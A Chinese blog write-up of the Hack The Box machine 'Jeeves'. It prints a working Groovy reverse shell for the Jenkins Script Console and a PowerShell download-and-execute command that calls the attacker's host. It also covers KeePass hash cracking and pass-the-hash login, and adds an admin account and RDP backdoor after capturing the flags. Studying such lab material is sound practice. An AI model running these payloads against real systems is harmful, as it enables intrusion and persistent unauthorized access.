> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/m-S4DPJep4b9HAuVghp8Zg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **66** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

  

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/114

靶机难度：中级（5.0/10）

靶机发布日期：2017 年 12 月 20 日

靶机描述：

Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

  

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3nWnLY9lJejoNQkW0icoTXa14UicsKbwUibAzhHN71VzQicXugXj8YVPtQQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.63.....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK30Ribca4Kqo1urQgGTdiaes6ibF5iboOnGfonbb1BtXmgWs838icW17VX8iaA/640?wx_fmt=png)

nmap 发现开放了 IIS server, RPC, Microsoft-ds 和 Jetty 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3RVvtOnvU6JPb0fzsZmAvapMNiaMPwhU2l94Ohfjde8xN96GMj2sZ1Qw/640?wx_fmt=png)

直接对 50000 端口的 http 进行爆破，发现存在、/askjeeves 目录...80 端口没扫到什么有用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3dJsLacroY5zN8aFWaKkz1J4CQzlbsmI8ymW5CQD1Q5PYK0QEoJ7kyg/640?wx_fmt=png)

访问进来，发现存在 Jenkins Manage... 应该能上传 shell 的地方...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3cmImqzwG6eibn2csmpcrJ7beL5FaJuugialAt7otPzAicFicxCWbX6UOmA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3u0uXv4E4fPSTG2Ux5ERaDj7F3YSuYlCWuHoO8ptDu9GXbQc9cEgEfg/640?wx_fmt=png)

发下在 Script Console 存在 Jenkins 语句写入...

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3aUiaTAericUGG8KWzmXNxZUlTVjicR7kojE1ZC2FE3c21kUbBmrd4p0wQ/640?wx_fmt=png)

```
String host="10.10.14.18";
int port=6666;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

可以看到，直接获得低权 shell...

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3BsicPrnKLZvD1OCOMcr8RuM15wbrmtcUmLrYBZKIcsUFRKFupxXgc7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK30kSzCgNggeeAGIqmEJytgNL6GsAFfQy3Ll1wwcUrGGqO6L4sVz839g/640?wx_fmt=png)

```
cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/dayu.ps1') """
println cmd.execute().txt
```

可以看到利用 nishang 脚本进行提权... 成功

方然还可以利用 nc.exe 去提权... 等等

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3lQFlrNPgv8CqldylBcssD7ibSa7DVKLAvAZsvKC3vibvAUstTBezicr6w/640?wx_fmt=png)

成功获得 user.txt 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3ZgjJwxYXAYrBUtTLnUNJBUhk4osvCXqPGibxWLkeB54icajG0wibWsGow/640?wx_fmt=png)

可以看到在 Documents 目录，看到 CEK.kdbx 的文件，本地开 smb 服务... 然后共享过来即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3wAOm9t6oVTcueTRkCjhZIFOeRaf4dpkQacj8BEPOEY9eUCUA3sMRbQ/640?wx_fmt=png)

keepass2john CEH.kdbx > dayu.hash 使用 keepass2john 从密钥文件中提取哈希值... 然后利用 john 破解哈希值...

```
moonshine1
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3QLwib1YNYeBiahk4iaC1xjia4BOicb4TsnSHpibpicTAy5hpw3S83CMmnBLlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK35cUJSTzXicBCHqm4zVMIIYicbH1YXatEWTRibUwdCKUqkbszabq9gO0Kg/640?wx_fmt=png)

获得密码 monshine1，可以访问密码管理器了，这里使用 keepass2 进入密码管理器... 成功进入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK32mOHibb7QsfRSibkXoLr1rQSkkYMt7rhB6WzqMbvrkG5XkbA2eQW7E9g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3vQTcrL2OQ6l4sl62pfCxZJBWkmViannY3QedicZMkBeibdlf4qO7iatgUw/640?wx_fmt=png)

发现了 administrator 密码... 发现登陆不上去，是错的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3JWfD5ohFlib0y8gKxnIN7FOlW9NDYhyicl3DEDu9ha2UHHbyrkS8FGbg/640?wx_fmt=png)

这里可利用的是 Backup 的密码，这是 Windows NTLM 哈希，可以通过哈希值进行攻击...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3y0jOhL6aDWvtESOqQVA6JibwDCmcF8IHicn3XSguLkiaGaYTGGx76qayw/640?wx_fmt=png)

可以看到成功通过 winexe 来执行账号哈希值攻击... 成功登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3rBRqNWu8ODxVUJJwIIdXWjdEtnDk4vicmCN9b6C1bfho3aNWyh3sOBA/640?wx_fmt=png)

本地并没有看到 root.txt，却看到了 hm.txt 文件... 提示说 flag 在更深处... 继续挖坑...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3MX0YlicchTApeUZI1IX6WS96O9tI9bia1AGOCeS6c0TGIdfM2mnldqIw/640?wx_fmt=png)

隐藏在数据流中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3ba9FR8EIC31NT3pRIndZqP9VSt2RP6MoKHPaLObfAaCoInh8stnVTQ/640?wx_fmt=png)

成功获得了 root.txt 文件...（虽然完成了任务，但是还没结束...）

最近有人说我文章很水，我很努力了，给你们拓展知识点了...

这是 HTB 上的靶机，在国外服务器上... 我们进去玩玩？？

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK30pzWgGPVeEpptWXmwsR6iayA6zHaicc6ib1aHE0SvA8uxH9KSA9nclsxg/640?wx_fmt=png)

这里以管理员身份创建了新的用户 dayu... 然后提升 dayu 用户的权限... 拉倒 administrator 组里...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3xE9RIR2IcyLNmXZ0eQ8icYlh8lp5gnNibIIlP6icxtKNMFoicgic6iaOsPaw/640?wx_fmt=png)

然后在本地启动远程桌面允许...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3iczYviadwPRFHvBWNW5gfJkbJSkL6QXSc4lVXdyurp4tt3n9XmdDYkkw/640?wx_fmt=png)

最后需要告诉 Windows 靶机的防火墙允许我们远程桌面连接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3t3kibdWzehib7M6Rnj2HHQeRNPQ3HmcexP10iaeH6bR1vz0P7uhibm3Ybg/640?wx_fmt=png)

输入前面创建的用户名密码即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPorKEibwB1rWGSuvlJicIibK3Ow1L5MwnaRY9Qz6vKIBTQ7DOhpBEzV0V8bss2ljeH8jJqbE8PQDbqA/640?wx_fmt=png)

可以看到进来了... 就看看哈，别搞事情...

  

  

  

进去太卡了，因为我的网络不是特别好... 可以在 administrator 桌面查看到数据流 hm.txt:root.txt 文件... 利用 get-item 查看即可...

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)